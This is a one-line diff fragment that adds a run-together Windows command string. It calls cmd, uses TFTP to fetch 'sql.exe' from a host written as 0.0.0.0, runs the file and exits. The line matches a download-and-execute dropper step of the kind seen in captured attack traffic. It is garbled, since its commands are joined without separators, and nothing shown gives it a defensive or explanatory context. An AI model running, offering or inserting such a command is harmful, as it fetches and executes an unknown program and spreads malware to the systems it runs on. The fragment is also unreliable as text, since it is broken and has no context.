@@ -1,0 +1,1 @@
+cmdtftp -i 0.0.0.0 GET sql.exesql.exeexit
